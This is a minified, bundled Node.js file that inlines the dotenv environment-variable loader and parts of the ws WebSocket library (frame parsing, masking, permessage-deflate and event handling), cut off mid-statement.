"use strict";var e=require("node:path"),t=require("fs"),s=require("path"),r=require("os"),i=require("stream"),o=require("zlib"),n=require("buffer"),a=require("crypto"),c=require("events"),l=require("https"),h=require("http"),d=require("net"),f=require("tls"),u=require("url"),p=require("child_process"),_=require("node:os"),m=require("node:child_process"),y=require("node:util");function g(e){return e&&"object"==typeof e&&"default"in e?e:{default:e}}var v=g(e),b=g(t),k=g(s),S=g(r),w=g(i),E=g(o),W=g(n),x=g(a),O=g(c),C=g(l),N=g(h),R=g(d),L=g(f),P=g(u),T=g(p),B=g(_);function I(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}var M={exports:{}},U={name:"dotenv",version:"16.0.3",description:"Loads environment variables from .env file",main:"lib/main.js",types:"lib/main.d.ts",exports:{".":{require:"./lib/main.js",types:"./lib/main.d.ts",default:"./lib/main.js"},"./config":"./config.js","./config.js":"./config.js","./lib/env-options":"./lib/env-options.js","./lib/env-options.js":"./lib/env-options.js","./lib/cli-options":"./lib/cli-options.js","./lib/cli-options.js":"./lib/cli-options.js","./package.json":"./package.json"},scripts:{"dts-check":"tsc --project tests/types/tsconfig.json",lint:"standard","lint-readme":"standard-markdown",pretest:"npm run lint && npm run dts-check",test:"tap tests/*.js --100 -Rspec",prerelease:"npm test",release:"standard-version"},repository:{type:"git",url:"git://github.com/motdotla/dotenv.git"},keywords:["dotenv","env",".env","environment","variables","config","settings"],readmeFilename:"README.md",license:"BSD-2-Clause",devDependencies:{"@types/node":"^17.0.9",decache:"^4.6.1",dtslint:"^3.7.0",sinon:"^12.0.1",standard:"^16.0.4","standard-markdown":"^7.1.0","standard-version":"^9.3.2",tap:"^15.1.6",tar:"^6.1.11",typescript:"^4.5.4"},engines:{node:">=12"}};const F=b.default,j=k.default,q=S.default,D=U.version,G=/(?:^|^)\s*(?:export\s+)?([\w.-]+)(?:\s*=\s*?|:\s+?)(\s*'(?:\\'|[^'])*'|\s*"(?:\\"|[^"])*"|\s*`(?:\\`|[^`])*`|[^#\r\n]+)?\s*(?:#.*)?(?:$|$)/gm;function A(e){console.log(`[dotenv@${D}][DEBUG] ${e}`)}const $={config:function(e){let t=j.resolve(process.cwd(),".env"),s="utf8";const r=Boolean(e&&e.debug),i=Boolean(e&&e.override);var o;e&&(null!=e.path&&(t="~"===(o=e.path)[0]?j.join(q.homedir(),o.slice(1)):o),null!=e.encoding&&(s=e.encoding));try{const e=$.parse(F.readFileSync(t,{encoding:s}));return Object.keys(e).forEach((function(t){Object.prototype.hasOwnProperty.call(process.env,t)?(!0===i&&(process.env[t]=e[t]),r&&A(!0===i?`"${t}" is already defined in \`process.env\` and WAS overwritten`:`"${t}" is already defined in \`process.env\` and was NOT overwritten`)):process.env[t]=e[t]})),{parsed:e}}catch(e){return r&&A(`Failed to load ${t} ${e.message}`),{error:e}}},parse:function(e){const t={};let s,r=e.toString();for(r=r.replace(/\r\n?/gm,"\n");null!=(s=G.exec(r));){const e=s[1];let r=s[2]||"";r=r.trim();const i=r[0];r=r.replace(/^(['"`])([\s\S]*)\1$/gm,"$2"),'"'===i&&(r=r.replace(/\\n/g,"\n"),r=r.replace(/\\r/g,"\r")),t[e]=r}return t}};var V=M.exports.config=$.config,J=M.exports.parse=$.parse;M.exports=$;var z=M.exports;function H(e,t,s){const r=function(e,t){const s=Array.from(e.matchAll(t));return s.length>0?s.slice(-1)[0].index:-1}(e,/(?!(?<=\\))\$/g);if(-1===r)return e;const i=e.slice(r).match(/((?!(?<=\\))\${?([\w]+)(?::-([^}\\]*))?}?)/);if(null!=i){const[,r,o,n]=i;return H(e.replace(r,t[o]||n||s.parsed[o]||""),t,s)}return e}function K(e){return e.replace(/\\\$/g,"$")}var Q=function(e){const t=e.ignoreProcessEnv?{}:process.env;for(const s in e.parsed){const r=Object.prototype.hasOwnProperty.call(t,s)?t[s]:e.parsed[s];e.parsed[s]=K(H(r,t,e))}for(const s in e.parsed)t[s]=e.parsed[s];return e},Y={exports:{}},Z={BINARY_TYPES:["nodebuffer","arraybuffer","fragments"],EMPTY_BUFFER:Buffer.alloc(0),GUID:"258EAFA5-E914-47DA-95CA-C5AB0DC85B11",kForOnEventAttribute:Symbol("kIsForOnEventAttribute"),kListener:Symbol("kListener"),kStatusCode:Symbol("status-code"),kWebSocket:Symbol("websocket"),NOOP:()=>{}};const{EMPTY_BUFFER:X}=Z,ee=Buffer[Symbol.species];function te(e,t,s,r,i){for(let o=0;o<i;o++)s[r+o]=e[o]^t[3&o]}function se(e,t){for(let s=0;s<e.length;s++)e[s]^=t[3&s]}if(Y.exports={concat:function(e,t){if(0===e.length)return X;if(1===e.length)return e[0];const s=Buffer.allocUnsafe(t);let r=0;for(let t=0;t<e.length;t++){const i=e[t];s.set(i,r),r+=i.length}return r<t?new ee(s.buffer,s.byteOffset,r):s},mask:te,toArrayBuffer:function(e){return e.length===e.buffer.byteLength?e.buffer:e.buffer.slice(e.byteOffset,e.byteOffset+e.length)},toBuffer:function e(t){if(e.readOnly=!0,Buffer.isBuffer(t))return t;let s;return t instanceof ArrayBuffer?s=new ee(t):ArrayBuffer.isView(t)?s=new ee(t.buffer,t.byteOffset,t.byteLength):(s=Buffer.from(t),e.readOnly=!1),s},unmask:se},!process.env.WS_NO_BUFFER_UTIL)try{const e=require("bufferutil");Y.exports.mask=function(t,s,r,i,o){o<48?te(t,s,r,i,o):e.mask(t,s,r,i,o)},Y.exports.unmask=function(t,s){t.length<32?se(t,s):e.unmask(t,s)}}catch(e){}var re=Y.exports;const ie=Symbol("kDone"),oe=Symbol("kRun");var ne=class{constructor(e){this[ie]=()=>{this.pending--,this[oe]()},this.concurrency=e||1/0,this.jobs=[],this.pending=0}add(e){this.jobs.push(e),this[oe]()}[oe](){if(this.pending!==this.concurrency&&this.jobs.length){const e=this.jobs.shift();this.pending++,e(this[ie])}}};const ae=E.default,ce=re,le=ne,{kStatusCode:he}=Z,de=Buffer[Symbol.species],fe=Buffer.from([0,0,255,255]),ue=Symbol("permessage-deflate"),pe=Symbol("total-length"),_e=Symbol("callback"),me=Symbol("buffers"),ye=Symbol("error");let ge;var ve=class{constructor(e,t,s){if(this._maxPayload=0|s,this._options=e||{},this._threshold=void 0!==this._options.threshold?this._options.threshold:1024,this._isServer=!!t,this._deflate=null,this._inflate=null,this.params=null,!ge){const e=void 0!==this._options.concurrencyLimit?this._options.concurrencyLimit:10;ge=new le(e)}}static get extensionName(){return"permessage-deflate"}offer(){const e={};return this._options.serverNoContextTakeover&&(e.server_no_context_takeover=!0),this._options.clientNoContextTakeover&&(e.client_no_context_takeover=!0),this._options.serverMaxWindowBits&&(e.server_max_window_bits=this._options.serverMaxWindowBits),this._options.clientMaxWindowBits?e.client_max_window_bits=this._options.clientMaxWindowBits:null==this._options.clientMaxWindowBits&&(e.client_max_window_bits=!0),e}accept(e){return e=this.normalizeParams(e),this.params=this._isServer?this.acceptAsServer(e):this.acceptAsClient(e),this.params}cleanup(){if(this._inflate&&(this._inflate.close(),this._inflate=null),this._deflate){const e=this._deflate[_e];this._deflate.close(),this._deflate=null,e&&e(new Error("The deflate stream was closed while data was being processed"))}}acceptAsServer(e){const t=this._options,s=e.find((e=>!(!1===t.serverNoContextTakeover&&e.server_no_context_takeover||e.server_max_window_bits&&(!1===t.serverMaxWindowBits||"number"==typeof t.serverMaxWindowBits&&t.serverMaxWindowBits>e.server_max_window_bits)||"number"==typeof t.clientMaxWindowBits&&!e.client_max_window_bits)));if(!s)throw new Error("None of the extension offers can be accepted");return t.serverNoContextTakeover&&(s.server_no_context_takeover=!0),t.clientNoContextTakeover&&(s.client_no_context_takeover=!0),"number"==typeof t.serverMaxWindowBits&&(s.server_max_window_bits=t.serverMaxWindowBits),"number"==typeof t.clientMaxWindowBits?s.client_max_window_bits=t.clientMaxWindowBits:!0!==s.client_max_window_bits&&!1!==t.clientMaxWindowBits||delete s.client_max_window_bits,s}acceptAsClient(e){const t=e[0];if(!1===this._options.clientNoContextTakeover&&t.client_no_context_takeover)throw new Error('Unexpected parameter "client_no_context_takeover"');if(t.client_max_window_bits){if(!1===this._options.clientMaxWindowBits||"number"==typeof this._options.clientMaxWindowBits&&t.client_max_window_bits>this._options.clientMaxWindowBits)throw new Error('Unexpected or invalid parameter "client_max_window_bits"')}else"number"==typeof this._options.clientMaxWindowBits&&(t.client_max_window_bits=this._options.clientMaxWindowBits);return t}normalizeParams(e){return e.forEach((e=>{Object.keys(e).forEach((t=>{let s=e[t];if(s.length>1)throw new Error(`Parameter "${t}" must have only a single value`);if(s=s[0],"client_max_window_bits"===t){if(!0!==s){const e=+s;if(!Number.isInteger(e)||e<8||e>15)throw new TypeError(`Invalid value for parameter "${t}": ${s}`);s=e}else if(!this._isServer)throw new TypeError(`Invalid value for parameter "${t}": ${s}`)}else if("server_max_window_bits"===t){const e=+s;if(!Number.isInteger(e)||e<8||e>15)throw new TypeError(`Invalid value for parameter "${t}": ${s}`);s=e}else{if("client_no_context_takeover"!==t&&"server_no_context_takeover"!==t)throw new Error(`Unknown parameter "${t}"`);if(!0!==s)throw new TypeError(`Invalid value for parameter "${t}": ${s}`)}e[t]=s}))})),e}decompress(e,t,s){ge.add((r=>{this._decompress(e,t,((e,t)=>{r(),s(e,t)}))}))}compress(e,t,s){ge.add((r=>{this._compress(e,t,((e,t)=>{r(),s(e,t)}))}))}_decompress(e,t,s){const r=this._isServer?"client":"server";if(!this._inflate){const e=`${r}_max_window_bits`,t="number"!=typeof this.params[e]?ae.Z_DEFAULT_WINDOWBITS:this.params[e];this._inflate=ae.createInflateRaw({...this._options.zlibInflateOptions,windowBits:t}),this._inflate[ue]=this,this._inflate[pe]=0,this._inflate[me]=[],this._inflate.on("error",Se),this._inflate.on("data",ke)}this._inflate[_e]=s,this._inflate.write(e),t&&this._inflate.write(fe),this._inflate.flush((()=>{const e=this._inflate[ye];if(e)return this._inflate.close(),this._inflate=null,void s(e);const i=ce.concat(this._inflate[me],this._inflate[pe]);this._inflate._readableState.endEmitted?(this._inflate.close(),this._inflate=null):(this._inflate[pe]=0,this._inflate[me]=[],t&&this.params[`${r}_no_context_takeover`]&&this._inflate.reset()),s(null,i)}))}_compress(e,t,s){const r=this._isServer?"server":"client";if(!this._deflate){const e=`${r}_max_window_bits`,t="number"!=typeof this.params[e]?ae.Z_DEFAULT_WINDOWBITS:this.params[e];this._deflate=ae.createDeflateRaw({...this._options.zlibDeflateOptions,windowBits:t}),this._deflate[pe]=0,this._deflate[me]=[],this._deflate.on("data",be)}this._deflate[_e]=s,this._deflate.write(e),this._deflate.flush(ae.Z_SYNC_FLUSH,(()=>{if(!this._deflate)return;let e=ce.concat(this._deflate[me],this._deflate[pe]);t&&(e=new de(e.buffer,e.byteOffset,e.length-4)),this._deflate[_e]=null,this._deflate[pe]=0,this._deflate[me]=[],t&&this.params[`${r}_no_context_takeover`]&&this._deflate.reset(),s(null,e)}))}};function be(e){this[me].push(e),this[pe]+=e.length}function ke(e){this[pe]+=e.length,this[ue]._maxPayload<1||this[pe]<=this[ue]._maxPayload?this[me].push(e):(this[ye]=new RangeError("Max payload size exceeded"),this[ye].code="WS_ERR_UNSUPPORTED_MESSAGE_LENGTH",this[ye][he]=1009,this.removeListener("data",ke),this.reset())}function Se(e){this[ue]._inflate=null,e[he]=1007,this[_e](e)}var we={exports:{}};const{isUtf8:Ee}=W.default;function We(e){const t=e.length;let s=0;for(;s<t;)if(0==(128&e[s]))s++;else if(192==(224&e[s])){if(s+1===t||128!=(192&e[s+1])||192==(254&e[s]))return!1;s+=2}else if(224==(240&e[s])){if(s+2>=t||128!=(192&e[s+1])||128!=(192&e[s+2])||224===e[s]&&128==(224&e[s+1])||237===e[s]&&160==(224&e[s+1]))return!1;s+=3}else{if(240!=(248&e[s]))return!1;if(s+3>=t||128!=(192&e[s+1])||128!=(192&e[s+2])||128!=(192&e[s+3])||240===e[s]&&128==(240&e[s+1])||244===e[s]&&e[s+1]>143||e[s]>244)return!1;s+=4}return!0}if(we.exports={isValidStatusCode:function(e){return e>=1e3&&e<=1014&&1004!==e&&1005!==e&&1006!==e||e>=3e3&&e<=4999},isValidUTF8:We,tokenChars:[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,1,1,1,0,0,1,1,0,1,1,0,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1,0]},Ee)we.exports.isValidUTF8=function(e){return e.length<24?We(e):Ee(e)};else if(!process.env.WS_NO_UTF_8_VALIDATE)try{const e=require("utf-8-validate");we.exports.isValidUTF8=function(t){return t.length<32?We(t):e(t)}}catch(e){}var xe=we.exports;const{Writable:Oe}=w.default,Ce=ve,{BINARY_TYPES:Ne,EMPTY_BUFFER:Re,kStatusCode:Le,kWebSocket:Pe}=Z,{concat:Te,toArrayBuffer:Be,unmask:Ie}=re,{isValidStatusCode:Me,isValidUTF8:Ue}=xe,Fe=Buffer[Symbol.species],je=Promise.resolve(),qe="function"==typeof queueMicrotask?queueMicrotask:function(e){je.then(e).catch($e)};var De=class extends Oe{constructor(e={}){super(),this._allowMultipleEventsPerMicrotask=!!e.allowMultipleEventsPerMicrotask,this._binaryType=e.binaryType||Ne[0],this._extensions=e.extensions||{},this._isServer=!!e.isServer,this._maxPayload=0|e.maxPayload,this._skipUTF8Validation=!!e.skipUTF8Validation,this[Pe]=void 0,this._bufferedBytes=0,this._buffers=[],this._compressed=!1,this._payloadLength=0,this._mask=void 0,this._fragmented=0,this._masked=!1,this._fin=!1,this._opcode=0,this._totalPayloadLength=0,this._messageLength=0,this._fragments=[],this._state=0,this._loop=!1}_write(e,t,s){if(8===this._opcode&&0==this._state)return s();this._bufferedBytes+=e.length,this._buffers.push(e),this.startLoop(s)}consume(e){if(this._bufferedBytes-=e,e===this._buffers[0].length)return this._buffers.shift();if(e<this._buffers[0].length){const t=this._buffers[0];return this._buffers[0]=new Fe(t.buffer,t.byteOffset+e,t.length-e),new Fe(t.buffer,t.byteOffset,e)}const t=Buffer.allocUnsafe(e);do{const s=this._buffers[0],r=t.length-e;e>=s.length?t.set(this._buffers.shift(),r):(t.set(new Uint8Array(s.buffer,s.byteOffset,e),r),this._buffers[0]=new Fe(s.buffer,s.byteOffset+e,s.length-e)),e-=s.length}while(e>0);return t}startLoop(e){let t;this._loop=!0;do{switch(this._state){case 0:t=this.getInfo();break;case 1:t=this.getPayloadLength16();break;case 2:t=this.getPayloadLength64();break;case 3:this.getMask();break;case 4:t=this.getData(e);break;case 5:return void(this._loop=!1);default:return this._loop=!1,void qe((()=>{this._state=0,this.startLoop(e)}))}}while(this._loop);e(t)}getInfo(){if(this._bufferedBytes<2)return void(this._loop=!1);const e=this.consume(2);if(0!=(48&e[0]))return this._loop=!1,Ge(RangeError,"RSV2 and RSV3 must be clear",!0,1002,"WS_ERR_UNEXPECTED_RSV_2_3");const t=64==(64&e[0]);if(t&&!this._extensions[Ce.extensionName])return this._loop=!1,Ge(RangeError,"RSV1 must be clear",!0,1002,"WS_ERR_UNEXPECTED_RSV_1");if(this._fin=128==(128&e[0]),this._opcode=15&e[0],this._payloadLength=127&e[1],0===this._opcode){if(t)return this._loop=!1,Ge(RangeError,"RSV1 must be clear",!0,1002,"WS_ERR_UNEXPECTED_RSV_1");if(!this._fragmented)return this._loop=!1,Ge(RangeError,"invalid opcode 0",!0,1002,"WS_ERR_INVALID_OPCODE");this._opcode=this._fragmented}else if(1===this._opcode||2===this._opcode){if(this._fragmented)return this._loop=!1,Ge(RangeError,`invalid opcode ${this._opcode}`,!0,1002,"WS_ERR_INVALID_OPCODE");this._compressed=t}else{if(!(this._opcode>7&&this._opcode<11))return this._loop=!1,Ge(RangeError,`invalid opcode ${this._opcode}`,!0,1002,"WS_ERR_INVALID_OPCODE");if(!this._fin)return this._loop=!1,Ge(RangeError,"FIN must be set",!0,1002,"WS_ERR_EXPECTED_FIN");if(t)return this._loop=!1,Ge(RangeError,"RSV1 must be clear",!0,1002,"WS_ERR_UNEXPECTED_RSV_1");if(this._payloadLength>125||8===this._opcode&&1===this._payloadLength)return this._loop=!1,Ge(RangeError,`invalid payload length ${this._payloadLength}`,!0,1002,"WS_ERR_INVALID_CONTROL_PAYLOAD_LENGTH")}if(this._fin||this._fragmented||(this._fragmented=this._opcode),this._masked=128==(128&e[1]),this._isServer){if(!this._masked)return this._loop=!1,Ge(RangeError,"MASK must be set",!0,1002,"WS_ERR_EXPECTED_MASK")}else if(this._masked)return this._loop=!1,Ge(RangeError,"MASK must be clear",!0,1002,"WS_ERR_UNEXPECTED_MASK");if(126===this._payloadLength)this._state=1;else{if(127!==this._payloadLength)return this.haveLength();this._state=2}}getPayloadLength16(){if(!(this._bufferedBytes<2))return this._payloadLength=this.consume(2).readUInt16BE(0),this.haveLength();this._loop=!1}getPayloadLength64(){if(this._bufferedBytes<8)return void(this._loop=!1);const e=this.consume(8),t=e.readUInt32BE(0);return t>Math.pow(2,21)-1?(this._loop=!1,Ge(RangeError,"Unsupported WebSocket frame: payload length > 2^53 - 1",!1,1009,"WS_ERR_UNSUPPORTED_DATA_PAYLOAD_LENGTH")):(this._payloadLength=t*Math.pow(2,32)+e.readUInt32BE(4),this.haveLength())}haveLength(){if(this._payloadLength&&this._opcode<8&&(this._totalPayloadLength+=this._payloadLength,this._totalPayloadLength>this._maxPayload&&this._maxPayload>0))return this._loop=!1,Ge(RangeError,"Max payload size exceeded",!1,1009,"WS_ERR_UNSUPPORTED_MESSAGE_LENGTH");this._masked?this._state=3:this._state=4}getMask(){this._bufferedBytes<4?this._loop=!1:(this._mask=this.consume(4),this._state=4)}getData(e){let t=Re;if(this._payloadLength){if(this._bufferedBytes<this._payloadLength)return void(this._loop=!1);t=this.consume(this._payloadLength),this._masked&&0!=(this._mask[0]|this._mask[1]|this._mask[2]|this._mask[3])&&Ie(t,this._mask)}return this._opcode>7?this.controlMessage(t):this._compressed?(this._state=5,void this.decompress(t,e)):(t.length&&(this._messageLength=this._totalPayloadLength,this._fragments.push(t)),this.dataMessage())}decompress(e,t){this._extensions[Ce.extensionName].decompress(e,this._fin,((e,s)=>{if(e)return t(e);if(s.length){if(this._messageLength+=s.length,this._messageLength>this._maxPayload&&this._maxPayload>0)return t(Ge(RangeError,"Max payload size exceeded",!1,1009,"WS_ERR_UNSUPPORTED_MESSAGE_LENGTH"));this._fragments.push(s)}const r=this.dataMessage();if(r)return t(r);this.startLoop(t)}))}dataMessage(){if(this._fin){const e=this._messageLength,t=this._fragments;if(this._totalPayloadLength=0,this._messageLength=0,this._fragmented=0,this._fragments=[],2===this._opcode){let s;s="nodebuffer"===this._binaryType?Te(t,e):"arraybuffer"===this._binaryType?Be(Te(t,e)):t,this.emit("message",s,!0)}else{const s=Te(t,e);if(!this._skipUTF8Validation&&!Ue(s))return this._loop=!1,Ge(Error,"invalid UTF-8 sequence",!0,1007,"WS_ERR_INVALID_UTF8");this.emit("message",s,!1)}}this._state=this._allowMultipleEventsPerMicrotask?0:6}controlMessage(e){if(8!==this._opcode)this.emit(9===this._opcode?"ping":"pong",e),this._state=this._allowMultipleEventsPerMicrotask?0:6;else{if(this._loop=!1,0===e.length)this.emit("conclude",1005,Re),this.end();else{const t=e.readUInt16BE(0);if(!Me(t))return Ge(RangeError,`invalid status code ${t}`,!0,1002,"WS_ERR_INVALID_CLOSE_CODE");const s=new Fe(e.buffer,e.byteOffset+2,e.length-2);if(!this._skipUTF8Validation&&!Ue(s))return Ge(Error,"invalid UTF-8 sequence",!0,1007,"WS_ERR_INVALID_UTF8");this.emit("conclude",t,s),this.end()}this._state=0}}};function Ge(e,t,s,r,i){const o=new e(s?`Invalid WebSocket frame: ${t}`:t);return Error.captureStackTrace(o,Ge),o.code=i,o[Le]=r,o}function Ae(e){throw e}function $e(e){process.nextTick(Ae,e)}const{randomFillSync:Ve}=x.default,Je=ve,{EMPTY_BUFFER:ze}=Z,{isValidStatusCode:He}=xe,{mask:Ke,toBuffer:Qe}=re,Ye=Symbol("kByteLength"),Ze=Buffer.alloc(4);class Xe{constructor(e,t,s){this._extensions=t||{},s&&(this._generateMask=s,this._maskBuffer=Buffer.alloc(4)),this._socket=e,this._firstFragment=!0,this._compress=!1,this._bufferedBytes=0,this._deflating=!1,this._queue=[]}static frame(e,t){let s,r,i=!1,o=2,n=!1;t.mask&&(s=t.maskBuffer||Ze,t.generateMask?t.generateMask(s):Ve(s,0,4),n=0==(s[0]|s[1]|s[2]|s[3]),o=6),"string"==typeof e?r=t.mask&&!n||void 0===t[Ye]?(e=Buffer.from(e)).length:t[Ye]:(r=e.length,i=t.mask&&t.readOnly&&!n);let a=r;r>=65536?(o+=8,a=127):r>125&&(o+=2,a=126);const c=Buffer.allocUnsafe(i?r+o:o);return c[0]=t.fin?128|t.opcode:t.opcode,t.rsv1&&(c[0]|=64),c[1]=a,126===a?c.writeUInt16BE(r,2):127===a&&(c[2]=c[3]=0,c.writeUIntBE(r,4,6)),t.mask?(c[1]|=128,c[o-4]=s[0],c[o-3]=s[1],c[o-2]=s[2],c[o-1]=s[3],n?[c,e]:i?(Ke(e,s,c,o,r),[c]):(Ke(e,s,e,0,r),[c,e])):[c,e]}close(e,t,s,r){let i;if(void 0===e)i=ze;else{if("number"!=typeof e||!He(e))throw new TypeError("First argument must be a valid error code number");if(void 0!==t&&t.length){const s=Buffer.byteLength(t);if(s>123)throw new RangeError("The message must not be greater than 123 bytes");i=Buffer.allocUnsafe(2+s),i.writeUInt16BE(e,0),"string"==typeof t?i.write(t,2):i.set(t,2)}else i=Buffer.allocUnsafe(2),i.writeUInt16BE(e,0)}const o={[Ye]:i.length,fin:!0,generateMask:this._generateMask,mask:s,maskBuffer:this._maskBuffer,opcode:8,readOnly:!1,rsv1:!1};this._deflating?this.enqueue([this.dispatch,i,!1,o,r]):this.sendFrame(Xe.frame(i,o),r)}ping(e,t,s){let r,i;if("string"==typeof e?(r=Buffer.byteLength(e),i=!1):(r=(e=Qe(e)).length,i=Qe.readOnly),r>125)throw new RangeError("The data size must not be greater than 125 bytes");const o={[Ye]:r,fin:!0,generateMask:this._generateMask,mask:t,maskBuffer:this._maskBuffer,opcode:9,readOnly:i,rsv1:!1};this._deflating?this.enqueue([this.dispatch,e,!1,o,s]):this.sendFrame(Xe.frame(e,o),s)}pong(e,t,s){let r,i;if("string"==typeof e?(r=Buffer.byteLength(e),i=!1):(r=(e=Qe(e)).length,i=Qe.readOnly),r>125)throw new RangeError("The data size must not be greater than 125 bytes");const o={[Ye]:r,fin:!0,generateMask:this._generateMask,mask:t,maskBuffer:this._maskBuffer,opcode:10,readOnly:i,rsv1:!1};this._deflating?this.enqueue([this.dispatch,e,!1,o,s]):this.sendFrame(Xe.frame(e,o),s)}send(e,t,s){const r=this._extensions[Je.extensionName];let i,o,n=t.binary?2:1,a=t.compress;if("string"==typeof e?(i=Buffer.byteLength(e),o=!1):(i=(e=Qe(e)).length,o=Qe.readOnly),this._firstFragment?(this._firstFragment=!1,a&&r&&r.params[r._isServer?"server_no_context_takeover":"client_no_context_takeover"]&&(a=i>=r._threshold),this._compress=a):(a=!1,n=0),t.fin&&(this._firstFragment=!0),r){const r={[Ye]:i,fin:t.fin,generateMask:this._generateMask,mask:t.mask,maskBuffer:this._maskBuffer,opcode:n,readOnly:o,rsv1:a};this._deflating?this.enqueue([this.dispatch,e,this._compress,r,s]):this.dispatch(e,this._compress,r,s)}else this.sendFrame(Xe.frame(e,{[Ye]:i,fin:t.fin,generateMask:this._generateMask,mask:t.mask,maskBuffer:this._maskBuffer,opcode:n,readOnly:o,rsv1:!1}),s)}dispatch(e,t,s,r){if(!t)return void this.sendFrame(Xe.frame(e,s),r);const i=this._extensions[Je.extensionName];this._bufferedBytes+=s[Ye],this._deflating=!0,i.compress(e,s.fin,((e,t)=>{if(this._socket.destroyed){const e=new Error("The socket was closed while data was being compressed");"function"==typeof r&&r(e);for(let t=0;t<this._queue.length;t++){const s=this._queue[t],r=s[s.length-1];"function"==typeof r&&r(e)}}else this._bufferedBytes-=s[Ye],this._deflating=!1,s.readOnly=!1,this.sendFrame(Xe.frame(t,s),r),this.dequeue()}))}dequeue(){for(;!this._deflating&&this._queue.length;){const e=this._queue.shift();this._bufferedBytes-=e[3][Ye],Reflect.apply(e[0],this,e.slice(1))}}enqueue(e){this._bufferedBytes+=e[3][Ye],this._queue.push(e)}sendFrame(e,t){2===e.length?(this._socket.cork(),this._socket.write(e[0]),this._socket.write(e[1],t),this._socket.uncork()):this._socket.write(e[0],t)}}var et=Xe;const{kForOnEventAttribute:tt,kListener:st}=Z,rt=Symbol("kCode"),it=Symbol("kData"),ot=Symbol("kError"),nt=Symbol("kMessage"),at=Symbol("kReason"),ct=Symbol("kTarget"),lt=Symbol("kType"),ht=Symbol("kWasClean");class dt{constructor(e){this[ct]=null,this[lt]=e}get target(){return this[ct]}get type(){return this[lt]}}Object.defineProperty(dt.prototype,"target",{enumerable:!0}),Object.defineProperty(dt.prototype,"type",{enumerable:!0});class ft extends dt{constructor(e,t={}){super(e),this[rt]=void 0===t.code?0:t.code,this[at]=void 0===t.reason?"":t.reason,this[ht]=void 0!==t.wasClean&&t.wasClean}get code(){return this[rt]}get reason(){return this[at]}get wasClean(){return this[ht]}}Object.defineProperty(ft.prototype,"code",{enumerable:!0}),Object.defineProperty(ft.prototype,"reason",{enumerable:!0}),Object.defineProperty(ft.prototype,"wasClean",{enumerable:!0});class ut extends dt{constructor(e,t={}){super(e),this[ot]=void 0===t.error?null:t.error,this[nt]=void 0===t.message?"":t.message}get error(){return this[ot]}get message(){return this[nt]}}Object.defineProperty(ut.prototype,"error",{enumerable:!0}),Object.defineProperty(ut.prototype,"message",{enumerable:!0});class pt extends dt{constructor(e,t={}){super(e),this[it]=void 0===t.data?null:t.data}get data(){return this[it]}}Object.defineProperty(pt.prototype,"data",{enumerable:!0});const _t={addEventListener(e,t,s={}){for(const r of this.listeners(e))if(!s[tt]&&r[st]===t&&!r[tt])return;let r;if("message"===e)r=function(e,s){const r=new pt("message",{data:s?e:e.toString()});r[ct]=this,yt(t,this,r)};else if("close"===e)r=function(e,s){const r=new ft("close",{code:e,reason:s.toString(),wasClean:this._closeFrameReceived&&this._closeFrameSent});r[ct]=this,yt(t,this,r)};else if("error"===e)r=function(e){const s=new ut("error",{error:e,message:e.message});s[ct]=this,yt(t,this,s)};else{if("open"!==e)return;r=function(){const e=new dt("open");e[ct]=this,yt(t,this,e)}}r[tt]=!!s[tt],r[st]=t,s.once?this.once(e,r):this.on(e,r)},removeEventListener(e,t){for(const s of this.listeners(e))if(s[st]===t&&!s[tt]){this.removeListener(e,s);break}}};var mt={CloseEvent:ft,ErrorEvent:ut,Event:dt,EventTarget:_t,MessageEvent:pt};function yt(e,t,s){"object"==typeof e&&e.handleEvent?e.handleEvent.call(e,s):e.call(t,s)}const{tokenChars:gt}=xe;function vt(e,t,s){void 0===e[t]?e[t]=[s]:e[t].push(s)}var bt={format:function(e){return Object.keys(e).map((t=>{let s=e[t];return Array.isArray(s)||(s=[s]),s.map((e=>[t].concat(Object.keys(e).map((t=>{let s=e[t];return Array.isArray(s)||(s=[s]),s.map((e=>!0===e?t:`${t}=${e}`)).join("; ")}))).join("; "))).join(", ")})).join(", ")},parse:function(e){const t=Object.create(null);let s,r,i=Object.create(null),o=!1,n=!1,a=!1,c=-1,l=-1,h=-1,d=0;for(;d<e.length;d++)if(l=e.charCodeAt(d),void 0===s)if(-1===h&&1===gt[l])-1===c&&(c=d);else if(0===d||32!==l&&9!==l){if(59!==l&&44!==l)throw new SyntaxError(`Unexpected character at index ${d}`);{if(-1===c)throw new SyntaxError(`Unexpected character at index ${d}`);-1===h&&(h=d);const r=e.slice(c,h);44===l?(vt(t,r,i),i=Object.create(null)):s=r,c=h=-1}}else-1===h&&-1!==c&&(h=d);else if(void 0===r)if(-1===h&&1===gt[l])-1===c&&(c=d);else if(32===l||9===l)-1===h&&-1!==c&&(h=d);else if(59===l||44===l){if(-1===c)throw new SyntaxError(`Unexpected character at index ${d}`);-1===h&&(h=d),vt(i,e.slice(c,h),!0),44===l&&(vt(t,s,i),i=Object.create(null),s=void 0),c=h=-1}else{if(61!==l||-1===c||-1!==h)throw new SyntaxError(`Unexpected character at index ${d}`);r=e.slice(c,d),c=h=-1}else if(n){if(1!==gt[l])throw new SyntaxError(`Unexpected character at index ${d}`);-1===c?c=d:o||(o=!0),n=!1}else if(a)if(1===gt[l])-1===c&&(c=d);else if(34===l&&-1!==c)a=!1,h=d;else{if(92!==l)throw new SyntaxError(`Unexpected character at index ${d}`);n=!0}else if(34===l&&61===e.charCodeAt(d-1))a=!0;else if(-1===h&&1===gt[l])-1===c&&(c=d);else if(-1===c||32!==l&&9!==l){if(59!==l&&44!==l)throw new SyntaxError(`Unexpected character at index ${d}`);{if(-1===c)throw new SyntaxError(`Unexpected character at index ${d}`);-1===h&&(h=d);let n=e.slice(c,h);o&&(n=n.replace(/\\/g,""),o=!1),vt(i,r,n),44===l&&(vt(t,s,i),i=Object.create(null),s=void 0),r=void 0,c=h=-1}}else-1===h&&(h=d);if(-1===c||a||32===l||9===l)throw new SyntaxError("Unexpected end of input");-1===h&&(h=d);const f=e.slice(c,h);return void 0===s?vt(t,f,i):(void 0===r?vt(i,f,!0):vt(i,r,o?f.replace(/\\/g,""):f),vt(t,s,i)),t}};const 